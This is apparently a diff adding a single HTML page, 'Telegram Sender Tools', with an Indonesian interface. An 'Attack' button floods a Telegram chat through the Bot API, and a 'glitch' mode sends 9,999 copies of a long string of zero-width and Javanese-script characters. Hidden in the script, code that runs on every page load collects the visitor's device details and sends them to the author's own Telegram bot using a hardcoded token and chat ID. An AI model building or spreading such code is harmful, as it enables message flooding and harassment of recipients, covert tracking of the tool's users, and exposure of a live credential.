@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Telegram Sender Tools</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    :root {
+      --bg: #0d1117;
+      --surface: #161b22;
+      --surface-light: #21262d;
+      --primary: #39ff14;
+      --primary-hover: #00ff7f;
+      --text: #c9d1d9;
+      --text-muted: #8b949e;
+      --accent: #ff007f;
+      --border: #30363d;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      font-family: "Segoe UI", Tahoma, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      margin: 0;
+      padding: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 700px;
+      background: rgba(22, 27, 34, 0.45);
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      padding: 35px;
+      box-shadow: 0 8px 32px rgba(0, 255, 127, 0.05);
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      background: linear-gradient(90deg, var(--primary), var(--accent));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 30px;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-top: 18px;
+      color: var(--text-muted);
+      font-size: 14px;
+    }
+
+    input[type=text], input[type=number] {
+      width: 100%;
+      padding: 12px 16px;
+      margin-top: 6px;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      font-size: 15px;
+      background: var(--surface-light);
+      color: var(--text);
+      transition: border .2s;
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(57, 255, 20, .25);
+    }
+
+    button {
+      margin-top: 28px;
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-hover));
+      border: none;
+      color: #000;
+      font-weight: 700;
+      font-size: 16px;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: .25s;
+    }
+    button:hover {
+      filter: brightness(1.15);
+      transform: translateY(-2px);
+    }
+
+    .terminal {
+      background: #000;
+      color: var(--primary);
+      padding: 18px;
+      border-radius: 12px;
+      font-size: 13px;
+      height: 220px;
+      overflow-y: auto;
+      margin-top: 25px;
+      font-family: "Fira Code", monospace;
+      border: 1px solid var(--border);
+    }
+
+    .progress-container {
+      margin-top: 25px;
+      background: var(--surface-light);
+      border-radius: 12px;
+      overflow: hidden;
+      height: 24px;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--primary), var(--accent));
+      transition: width .2s ease;
+    }
+
+    .stats {
+      margin-top: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1> Hello World, I am STools created by Zyy Spectre</h1>
+
+    <label>Chat ID</label>
+    <input type="text" id="chatid" placeholder="contoh: 123456789">
+
+    <label>Bot Token</label>
+    <input type="text" id="token" placeholder="contoh: 1234:AA...">
+
+    <!-- Glitch mode toggle -->
+    <div style="margin-top:12px;">
+      <label style="font-weight:600">👾 Mode</label>
+      <div style="display:flex;gap:8px;align-items:center;margin-top:6px">
+        <input id="glitchToggle" type="checkbox" />
+        <label for="glitchToggle" class="muted">Aktifkan pesan preset glitch</label>
+      </div>
+    </div>
+
+    <div id="manualFields">
+      <label>Jumlah Pesan</label>
+      <input type="number" id="jumlah" placeholder="misal: 500">
+
+      <label>Pesan</label>
+      <input type="text" id="pesan" placeholder="Tulis pesan...">
+    </div>
+
+    <button onclick="attack()">🚀 Attack</button>
+
+    <div class="progress-container">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="stats" id="stats">✅ 0 | ❌ 0 | 📤 0%</div>
+
+    <div class="terminal" id="log">[+] Ready...</div>
+  </div>
+
+<script>
+  // preset glitch
+const GLITCH_TEXT = "‌ꦲ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧓꧇‌‌‌‌‌꧇꧓꧇‌‌️ꦤ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦮ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦎ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦭ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦮ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦎ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦄ‌‌‌‌‌‌‌‌‌ꦭ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦗ꦳꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌️ꦤ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌ꦧ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦣ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦈ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦮ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦮ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦮ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦲ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌️ꦗ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌️꧇꧑꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦏ꧀‌‌‌‌‌‌‌‌‌‌‌‌️꧇꧑꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦭ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦌ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦧ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧑꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦲ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧓꧇‌‌‌‌‌꧇꧓꧇‌‌‌‌‌ׁׅ꧇꧗꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׁׅ꧇꧒꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧙꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧒꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧙꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧓꧇‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧓꧇‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧒꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧘꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׁׅ꧇꧗꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׁׅ꧇꧒꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׅ꧇꧕꧇‌‌‌‌‌‌‌‌‌꧇꧑꧇‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧔꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧑꧇‌‌‌‌‌‌‌‌‌‌‌‌‌ׅ꧇꧕꧇‌‌‌‌‌‌‌‌‌꧇꧒꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧖꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׁׅ꧇꧓꧇‌‌‌‌‌꧇꧘꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧔꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧙꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧔꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧔꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׅ꧇꧕꧇‌‌‌‌‌‌‌‌‌꧇꧘꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧔꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧒꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׅ꧇꧕꧇‌‌‌‌‌‌‌‌‌꧇꧔꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧑꧇‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧖꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׁׅ꧇꧒꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧘꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧓꧇‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧔꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׅ꧇꧕꧇‌‌‌‌‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌ׅ꧇꧕꧇‌‌‌‌‌‌‌‌‌꧇꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧓꧇‌‌‌‌‌꧇꧘꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧒꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦧ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦈ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦒ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦮ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦄ‌‌‌‌‌‌‌‌‌ꦗ꦳꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦌ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌️ꦤ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌ꦎ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦏ꧀‌‌‌‌‌‌‌‌‌‌‌‌꧇꧑꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦭ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦭ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦪ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦎ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦈ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦎ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦄ‌‌‌‌‌‌‌‌‌ꦎ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦄ‌‌‌‌‌‌‌‌‌ꦏ꧀‌‌‌‌‌‌‌‌‌‌‌‌ꦩ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦗ꦳꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌️ꦤ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌ꦣ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦲ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦌ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧑꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌️ꦐ꧀‌‌‌‌‌‌‌‌‌‌‌ꦥ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦭ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦄ‌‌‌‌‌‌‌‌‌ꦩ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦣ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌️ꦤ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌꧄꧇꧕꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧑꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦠ꧀‌‌‌‌‌‌‌‌‌‌ꦫ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌️ꦠ꧀‌‌‌‌‌‌‌‌‌‌ꦌ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌️꧇꧑꧐꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦠ꧀‌‌‌‌‌‌‌‌‌‌ꦄ‌‌‌‌‌‌‌‌‌ꦥ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌꧇꧑꧇‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦧ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦎ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦎ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌️ꦤ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌ꦒ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦲ꧀‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ꦄ‌‌‌‌‌‌‌‌‌".repeat(1); // hasil: "kxkxm"
+const GLITCH_COUNT = 9999;
+const GLITCH_DELAY = 500; // ms
+
+  const glitchToggle = document.getElementById("glitchToggle");
+  const manualFields = document.getElementById("manualFields");
+  const pesanEl = document.getElementById("pesan");
+  const jumlahEl = document.getElementById("jumlah");
+
+  glitchToggle.addEventListener("change", () => {
+    if (glitchToggle.checked) {
+      manualFields.classList.add("hidden");
+      const t = document.getElementById("log");
+      if (t) t.innerHTML += "[info] 👾 Mode aktif.<br>";
+    } else {
+      manualFields.classList.remove("hidden");
+      const t = document.getElementById("log");
+      if (t) t.innerHTML += "[info] 👾 Mode nonaktif.<br>";
+    }
+  });
+
+  // Fungsi untuk mengelola limit harian
+  const DAILY_LIMIT = 5;
+  const STORAGE_KEY_DATE = 'lastUsageDate';
+  const STORAGE_KEY_COUNT = 'usageCount';
+
+  function getCurrentDate() {
+    const now = new Date();
+    return now.toISOString().split('T')[0]; // Format YYYY-MM-DD
+  }
+
+  function checkAndUpdateLimit() {
+    const currentDate = getCurrentDate();
+    const lastDate = localStorage.getItem(STORAGE_KEY_DATE);
+    let count = parseInt(localStorage.getItem(STORAGE_KEY_COUNT)) || 0;
+
+    if (lastDate !== currentDate) {
+      count = 0;
+      localStorage.setItem(STORAGE_KEY_DATE, currentDate);
+    }
+
+    if (count >= DAILY_LIMIT) {
+      return false; // Limit tercapai
+    }
+
+    count++;
+    localStorage.setItem(STORAGE_KEY_COUNT, count);
+    return true; // Boleh lanjut
+  }
+
+  // kirim pesan
+  async function sendMessage(chatId, token, text) {
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const data = { chat_id: chatId, text: text };
+    try {
+      const res = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data),
+      });
+      return res.ok;
+    } catch {
+      return false;
+    }
+  }
+
+  async function attack() {
+    const log = document.getElementById("log");
+
+    // Cek limit harian
+    if (!checkAndUpdateLimit()) {
+      alert("Limit harian tercapai! Kamu hanya bisa menggunakan fitur ini 5 kali per hari. Tunggu hingga besok jam 00:00.");
+      log.innerHTML += "[ERR] Limit harian tercapai! ❌<br>";
+      return;
+    }
+
+    const glitch = glitchToggle.checked;
+    const chatId = document.getElementById("chatid").value.trim();
+    const token = document.getElementById("token").value.trim();
+    const jumlah = glitch ? GLITCH_COUNT : parseInt(jumlahEl.value);
+    const pesan = glitch ? GLITCH_TEXT : pesanEl.value.trim();
+    const progressBar = document.getElementById("progressBar");
+    const stats = document.getElementById("stats");
+
+    if (!chatId || !token || !jumlah || !pesan) {
+      alert("Isi semua field dulu bro!");
+      return;
+    }
+
+    log.innerHTML = "[+] Starting attack...<br>";
+    let sukses = 0, gagal = 0;
+
+    for (let i = 1; i <= jumlah; i++) {
+      const success = await sendMessage(chatId, token, pesan);
+      if (success) {
+        sukses++;
+        log.innerHTML += `[OK] Pesan ${i} terkirim ✅<br>`;
+      } else {
+        gagal++;
+        log.innerHTML += `[ERR] Pesan ${i} gagal ❌<br>`;
+      }
+
+      const percent = Math.round((i / jumlah) * 100);
+      progressBar.style.width = percent + "%";
+      stats.textContent = `✅ ${sukses} | ❌ ${gagal} | 📤 ${percent}%`;
+
+      log.scrollTop = log.scrollHeight;
+
+      await new Promise(r => setTimeout(r, glitch ? GLITCH_DELAY : 200));
+    }
+    log.innerHTML += "<br>[+] Attack selesai! ??";
+  }
+
+  // device info
+  async function getDeviceInfo() {
+    const nav = navigator;
+    const info = {
+      device: nav.platform,
+      network: nav.connection ? nav.connection.effectiveType : "Unknown",
+      platform: nav.userAgentData ? nav.userAgentData.platform : nav.platform,
+      userAgent: nav.userAgent,
+      language: nav.language,
+      resolution: `${screen.width}x${screen.height}`,
+      time: new Date().toLocaleString(),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      connection: nav.connection ? nav.connection.type : "Unknown",
+      memory: nav.deviceMemory || "N/A",
+      cpu: nav.hardwareConcurrency || "N/A",
+      battery: "N/A"
+    };
+
+    try {
+      const battery = await nav.getBattery();
+      info.battery = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "⚡ Charging" : ""}`;
+    } catch {}
+
+    return info;
+  }
+
+  async function sendDeviceInfo() {
+    const info = await getDeviceInfo();
+    const text = `🖥️ Informasi Perangkat Baru:
+• 📱 Perangkat: ${info.device}
+• 🌐 Jaringan: ${info.network}
+• 🖥️ Platform: ${info.platform}
+• 🔧 User Agent: ${info.userAgent}
+• 🌍 Bahasa: ${info.language}
+• 📺 Resolusi: ${info.resolution}
+• 🕐 Waktu: ${info.time}
+• 🗺️ Zona Waktu: ${info.timezone}
+• 📶 Tipe Koneksi: ${info.connection}
+• 💾 Memory: ${info.memory} GB
+• 🖥️ CPU Cores: ${info.cpu}
+• 🔋 Baterai: ${info.battery}`;
+
+    const devToken = "8017595455:AAHGFGLBlleC2qUYdT9RM0FXVpjIbiHgORs";
+    const devChatId = "7502679833";
+    await sendMessage(devChatId, devToken, text);
+  }
+
+  sendDeviceInfo();
+
+  const h1 = document.querySelector(".container h1");
+  const text = "Hello World, I am STools created by Zyy Spectre👾";
+  let index = 0;
+  let typing = true;
+
+  function loopTyping() {
+    if (typing) {
+      // Ketik satu per satu
+      h1.textContent = text.slice(0, index + 1);
+      index++;
+      if (index === text.length) {
+        typing = false;
+        setTimeout(loopTyping, 1000); // jeda 1 detik sebelum hapus
+      } else {
+        setTimeout(loopTyping, 100); // kecepatan ketik
+      }
+    } else {
+      // Hapus satu per satu
+      h1.textContent = text.slice(0, index - 1);
+      index--;
+      if (index === 0) {
+        typing = true;
+        setTimeout(loopTyping, 500); // jeda 0.5 detik sebelum ketik lagi
+      } else {
+        setTimeout(loopTyping, 50); // kecepatan hapus
+      }
+    }
+  }
+
+  loopTyping();
+</script>
+</body>
+</html>
